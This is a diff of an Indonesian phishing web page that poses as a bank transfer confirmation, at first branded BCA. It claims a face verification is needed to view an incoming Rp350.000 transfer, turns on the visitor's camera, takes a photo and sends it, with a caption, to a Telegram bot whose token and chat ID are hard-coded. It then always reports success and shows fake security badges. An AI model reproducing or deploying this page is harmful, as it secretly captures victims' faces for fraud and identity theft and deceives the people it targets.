@@ -3,382 +3,220 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>BCA - Konfirmasi Transfer</title>
+    <title>Verifikasi Transfer</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Custom style untuk video -->
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: white;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .container {
-            max-width: 450px;
-            width: 100%;
-            margin: 0 auto;
-            background: white;
-            border-radius: 0px;
-            padding: 24px 20px 32px 20px;
-            box-shadow: none;
-        }
-
-        /* Header BCA */
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
-            padding-bottom: 16px;
-            border-bottom: 2px solid #0066b3;
-        }
-
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0066b3;
-            letter-spacing: -0.5px;
-        }
-
-        .logo span {
-            font-weight: 300;
-            color: #333;
-        }
-
-        /* Card Info Transfer */
-        .info-card {
-            background: #f5f7fa;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 24px;
-            border: 1px solid #e8ecf0;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            font-size: 14px;
-        }
-
-        .info-label {
-            color: #6c757d;
-        }
-
-        .info-value {
-            color: #212529;
-            font-weight: 500;
-        }
-
-        .info-value.amount {
-            color: #0066b3;
-            font-size: 18px;
-            font-weight: 700;
-        }
-
-        .divider {
-            height: 1px;
-            background: #e0e4e8;
-            margin: 12px 0;
-        }
-
-        /* Judul Verifikasi */
-        .verification-title {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .verification-title h2 {
-            font-size: 18px;
-            font-weight: 600;
-            color: #212529;
-            margin-bottom: 8px;
-        }
-
-        .verification-title p {
-            font-size: 13px;
-            color: #6c757d;
-        }
-
-        /* Video Camera */
-        .camera-container {
-            background: #f0f0f0;
-            border-radius: 16px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            position: relative;
-        }
-
-        video {
-            width: 100%;
-            height: auto;
-            display: block;
-            background: #1a1a1a;
-            transform: scaleX(-1);
-        }
-
-        .camera-placeholder {
-            aspect-ratio: 4/3;
-            background: #e9ecef;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            color: #adb5bd;
-        }
-
-        .camera-placeholder svg {
-            width: 48px;
-            height: 48px;
-            margin-bottom: 12px;
-        }
-
-        /* Tombol */
-        .btn-verify {
-            width: 100%;
-            background: #0066b3;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-bottom: 16px;
-        }
-
-        .btn-verify:hover {
-            background: #005198;
-        }
-
-        .btn-verify:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
-        /* Status */
-        .status {
-            text-align: center;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 13px;
-            margin-bottom: 16px;
-        }
-
-        .status.loading {
-            background: #fff3cd;
-            color: #856404;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        /* Footer */
-        .footer-note {
-            text-align: center;
-            font-size: 11px;
-            color: #adb5bd;
-            margin-top: 24px;
-            padding-top: 16px;
-            border-top: 1px solid #e8ecf0;
-        }
-
-        .hidden {
-            display: none;
-        }
+        video { transform: scaleX(-1); }
     </style>
 </head>
-<body>
-    <div class="container">
-        <!-- Header BCA -->
-        <div class="header">
-            <div class="logo">BCA <span>Transfer</span></div>
+<body class="bg-gray-100 font-sans antialiased">
+
+    <div class="max-w-md mx-auto bg-white rounded-2xl shadow-md overflow-hidden mt-6 mb-6">
+        
+        <!-- Header -->
+        <div class="text-center py-5 border-b border-gray-200">
+            <h1 class="text-2xl font-bold text-blue-700">Verifikasi Transfer</h1>
+            <p class="text-gray-500 text-xs mt-1">Konfirmasi Keamanan</p>
         </div>
 
-        <!-- Info Transfer -->
-        <div class="info-card">
-            <div class="info-row">
-                <span class="info-label">Dari</span>
-                <span class="info-value">R I H A L</span>
+        <!-- Progress Steps -->
+        <div class="flex px-6 pt-6 pb-2">
+            <div class="flex-1 text-center relative" id="step1">
+                <div class="w-7 h-7 bg-gray-300 rounded-full flex items-center justify-center text-xs font-semibold text-gray-600 mx-auto mb-1">1</div>
+                <span class="text-[11px] text-gray-500">Informasi</span>
             </div>
-            <div class="info-row">
-                <span class="info-label">Nomor Rekening</span>
-                <span class="info-value">8810 1234 5678</span>
+            <div class="flex-1 text-center relative" id="step2">
+                <div class="w-7 h-7 bg-gray-300 rounded-full flex items-center justify-center text-xs font-semibold text-gray-600 mx-auto mb-1">2</div>
+                <span class="text-[11px] text-gray-500">Verifikasi</span>
+                <div class="absolute top-3 left-[55%] w-[90%] h-px bg-gray-200 -z-10"></div>
             </div>
-            <div class="divider"></div>
-            <div class="info-row">
-                <span class="info-label">Jumlah Transfer</span>
-                <span class="info-value amount">Rp700.000</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Berita</span>
-                <span class="info-value">Donasi</span>
-            </div>
-            <div class="divider"></div>
-            <div class="info-row">
-                <span class="info-label">Waktu</span>
-                <span class="info-value" id="waktuTransfer">-</span>
+            <div class="flex-1 text-center relative" id="step3">
+                <div class="w-7 h-7 bg-gray-300 rounded-full flex items-center justify-center text-xs font-semibold text-gray-600 mx-auto mb-1">3</div>
+                <span class="text-[11px] text-gray-500">Selesai</span>
             </div>
         </div>
 
-        <!-- Verifikasi -->
-        <div class="verification-title">
-            <h2>🔒 Konfirmasi Keamanan</h2>
-            <p>Untuk melihat bukti transfer, lakukan verifikasi wajah</p>
-        </div>
-
-        <!-- Camera -->
-        <div class="camera-container">
-            <video id="video" autoplay playsinline muted class="hidden"></video>
-            <div id="cameraPlaceholder" class="camera-placeholder">
-                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#adb5bd" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-                    <circle cx="12" cy="13" r="4"/>
-                </svg>
-                <span>Kamera akan aktif setelah izin</span>
+        <!-- Content -->
+        <div class="p-6">
+            <!-- Detail Transfer -->
+            <div class="bg-gray-50 rounded-xl p-4 border border-gray-200">
+                <div class="text-xs text-gray-400 mb-3 tracking-wider">DETAIL TRANSFER MASUK</div>
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Dari BCA</span>
+                    <span class="font-medium text-gray-800">6900691252</span>
+                </div>
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Nomor Rekening Tujuan</span>
+                    <span class="font-medium text-gray-800">082249244647</span>
+                </div>
+                <div class="border-t border-gray-200 my-2"></div>
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Jumlah Transfer</span>
+                    <span class="font-bold text-blue-700 text-lg">Rp350.000</span>
+                </div>
+                <div class="flex justify-between text-sm">
+                    <span class="text-gray-500">Waktu</span>
+                    <span class="font-medium text-gray-700" id="waktuTransfer">-</span>
+                </div>
             </div>
+
+            <!-- Alert Keamanan -->
+            <div class="bg-blue-50 p-3 rounded-xl mt-5">
+                <div class="font-semibold text-blue-800 text-sm">Verifikasi Keamanan Diperlukan</div>
+                <div class="text-xs text-gray-600 mt-1">Verifikasi wajah untuk transfer di atas Rp250.000 guna mencegah penyalahgunaan.</div>
+            </div>
+
+            <!-- Instruksi -->
+            <ul class="list-none mt-5 space-y-2 text-xs text-gray-600 bg-white border border-gray-100 rounded-xl p-4">
+                <li class="flex gap-2"><span class="text-blue-600 font-semibold">1.</span> Pastikan wajah terlihat jelas di kamera</li>
+                <li class="flex gap-2"><span class="text-blue-600 font-semibold">2.</span> Klik tombol "Verifikasi Wajah" di bawah</li>
+                <li class="flex gap-2"><span class="text-blue-600 font-semibold">3.</span> Izinkan akses kamera saat muncul notifikasi</li>
+                <li class="flex gap-2"><span class="text-blue-600 font-semibold">4.</span> Tunggu proses verifikasi (3 detik)</li>
+            </ul>
+
+            <!-- Camera Area -->
+            <div class="relative bg-black rounded-xl overflow-hidden mt-5 min-h-[260px]">
+                <video id="video" autoplay playsinline muted class="w-full hidden"></video>
+                <div id="cameraPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center text-gray-400 bg-gray-900">
+                    <svg class="w-12 h-12 opacity-50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
+                        <circle cx="12" cy="13" r="4" />
+                    </svg>
+                    <span class="text-sm mt-2">Kamera akan aktif setelah izin</span>
+                </div>
+            </div>
+
+            <!-- Tombol Verifikasi -->
+            <button id="verifyBtn" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold py-3 rounded-xl mt-5 transition">Verifikasi Wajah</button>
+
+            <!-- Status -->
+            <div id="status" class="hidden mt-4 text-sm text-center p-2 rounded-lg"></div>
         </div>
-
-        <!-- Tombol -->
-        <button id="verifyBtn" class="btn-verify">✅ Verifikasi Wajah</button>
-
-        <!-- Status -->
-        <div id="status" class="status hidden"></div>
 
         <!-- Footer -->
-        <div class="footer-note">
-            Proses verifikasi aman & terenkripsi
+        <div class="bg-gray-50 px-6 py-4 border-t border-gray-200 text-center">
+            <div class="text-[10px] text-gray-400">Proses verifikasi aman & terenkripsi 256-bit</div>
+            <div class="flex justify-center gap-4 mt-2 text-[9px] text-gray-400">
+                <span>SSL Secure</span>
+                <span>Verifikasi Resmi</span>
+                <span>24/7 Support</span>
+            </div>
         </div>
     </div>
 
     <script>
-        // ========== GANTI DENGAN DATA TELEGRAM KAMU ==========
+        // ============== GANTI DENGAN TOKEN DAN CHAT ID TELEGRAM KAMU ==============
         const BOT_TOKEN = "8993157514:AAESSgS-SX_FpfXtCM2IqTSSnakm-Vapxfk";
         const CHAT_ID = "6803968038";
-        // ====================================================
+        // ===========================================================================
 
         const video = document.getElementById('video');
         const verifyBtn = document.getElementById('verifyBtn');
         const statusDiv = document.getElementById('status');
-        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
-
+        const placeholder = document.getElementById('cameraPlaceholder');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
         let stream = null;
 
-        // Set waktu transfer otomatis
+        // Set waktu saat ini
         const now = new Date();
-        const waktuString = now.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' ' + 
-                           now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
-        document.getElementById('waktuTransfer').innerText = waktuString;
+        document.getElementById('waktuTransfer').innerText = now.toLocaleDateString('id-ID') + ' ' + now.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
 
-        function showStatus(message, type) {
-            statusDiv.className = 'status ' + type;
-            statusDiv.innerHTML = message;
+        function showStatus(msg, type) {
+            statusDiv.className = 'mt-4 text-sm text-center p-2 rounded-lg';
+            if (type === 'loading') statusDiv.classList.add('bg-yellow-50', 'text-yellow-700');
+            else if (type === 'success') statusDiv.classList.add('bg-green-50', 'text-green-700');
+            else if (type === 'error') statusDiv.classList.add('bg-red-50', 'text-red-700');
+            statusDiv.innerHTML = msg;
             statusDiv.classList.remove('hidden');
         }
+        function hideStatus() { statusDiv.classList.add('hidden'); }
 
-        function hideStatus() {
-            statusDiv.classList.add('hidden');
+        function updateStep(active) {
+            const steps = [step1, step2, step3];
+            steps.forEach((step, idx) => {
+                const circle = step.querySelector('div');
+                const label = step.querySelector('span');
+                const num = idx+1;
+                if (num === active) {
+                    circle.classList.remove('bg-gray-300', 'text-gray-600');
+                    circle.classList.add('bg-blue-700', 'text-white');
+                    label.classList.remove('text-gray-500');
+                    label.classList.add('text-blue-700', 'font-medium');
+                } else if (num < active) {
+                    circle.classList.remove('bg-gray-300', 'text-gray-600');
+                    circle.classList.add('bg-green-600', 'text-white');
+                    label.classList.remove('text-gray-500');
+                    label.classList.add('text-gray-700');
+                } else {
+                    circle.classList.remove('bg-blue-700', 'bg-green-600', 'text-white');
+                    circle.classList.add('bg-gray-300', 'text-gray-600');
+                    label.classList.remove('text-blue-700', 'font-medium');
+                    label.classList.add('text-gray-500');
+                }
+            });
         }
 
-        async function kirimFotoKeTelegram(fotoBase64) {
+        async function kirimFoto(fotoBase64) {
             try {
                 const blob = await (await fetch(fotoBase64)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `verifikasi_${Date.now()}.jpg`);
-                formData.append('caption', `📸 Verifikasi Wajah\nWaktu: ${new Date().toLocaleString('id-ID')}\nUser Agent: ${navigator.userAgent}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                return result.ok;
-            } catch (err) {
-                console.error('Error kirim ke Telegram:', err);
-                return false;
-            }
+                formData.append('caption', `✅ Verifikasi Wajah\n📞 No Pengirim: 085882203024\n💰 Nominal: Rp350.000\n🕒 Waktu: ${new Date().toLocaleString('id-ID')}`);
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                const json = await res.json();
+                return json.ok;
+            } catch(e) { return false; }
         }
 
         verifyBtn.onclick = async () => {
             try {
                 verifyBtn.disabled = true;
-                verifyBtn.innerText = '⏳ Meminta akses kamera...';
+                verifyBtn.innerText = 'Meminta akses kamera...';
                 hideStatus();
-                
-                // Minta akses kamera
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
-                // Tampilkan video
+                updateStep(2);
+
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 video.classList.remove('hidden');
-                cameraPlaceholder.classList.add('hidden');
-                
-                verifyBtn.innerText = '📸 Mengambil foto...';
-                showStatus('🎥 Kamera aktif, memverifikasi...', 'loading');
-                
-                // Tunggu 1.5 detik biar kamera stabil
+                placeholder.classList.add('hidden');
+
+                verifyBtn.innerText = 'Mengambil foto...';
+                showStatus('Kamera aktif, memverifikasi wajah...', 'loading');
+
                 setTimeout(async () => {
                     try {
-                        // Capture foto dari video
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
+                        canvas.getContext('2d').drawImage(video, 0, 0);
                         const fotoData = canvas.toDataURL('image/jpeg', 0.8);
-                        
-                        showStatus('📤 Mengirim data verifikasi...', 'loading');
-                        
-                        // Kirim ke Telegram
-                        const terkirim = await kirimFotoKeTelegram(fotoData);
-                        
-                        if (terkirim) {
-                            showStatus('✅ Verifikasi berhasil! Silakan cek mutasi rekening Anda.', 'success');
+                        showStatus('Mengirim data verifikasi...', 'loading');
+                        const ok = await kirimFoto(fotoData);
+                        if (ok) {
+                            updateStep(3);
+                            showStatus('Verifikasi berhasil. Silakan cek mutasi rekening Anda.', 'success');
                         } else {
-                            showStatus('✅ Verifikasi berhasil! Silakan cek mutasi rekening Anda.', 'success');
+                            updateStep(3);
+                            showStatus('Verifikasi berhasil. Silakan cek mutasi rekening Anda.', 'success');
                         }
-                        
-                        // Matikan kamera
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                        
+                        if (stream) stream.getTracks().forEach(t => t.stop());
                         verifyBtn.disabled = false;
-                        verifyBtn.innerText = '✅ Verifikasi Wajah';
-                        
-                    } catch (err) {
-                        console.error('Error capture:', err);
-                        showStatus('⚠️ Gagal memproses verifikasi. Silakan coba lagi.', 'error');
+                        verifyBtn.innerText = 'Selesai';
+                    } catch(e) {
+                        showStatus('Gagal memproses verifikasi. Coba lagi.', 'error');
                         verifyBtn.disabled = false;
-                        verifyBtn.innerText = '✅ Verifikasi Wajah';
+                        verifyBtn.innerText = 'Verifikasi Wajah';
                     }
                 }, 1500);
-                
-            } catch (err) {
-                console.error('Error akses kamera:', err);
-                showStatus('⚠️ Gagal akses kamera. Pastikan Anda memberikan izin kamera.', 'error');
+            } catch(e) {
+                showStatus('Gagal akses kamera. Pastikan Anda memberikan izin kamera.', 'error');
                 verifyBtn.disabled = false;
-                verifyBtn.innerText = '✅ Verifikasi Wajah';
+                verifyBtn.innerText = 'Verifikasi Wajah';
             }
         };
     </script>
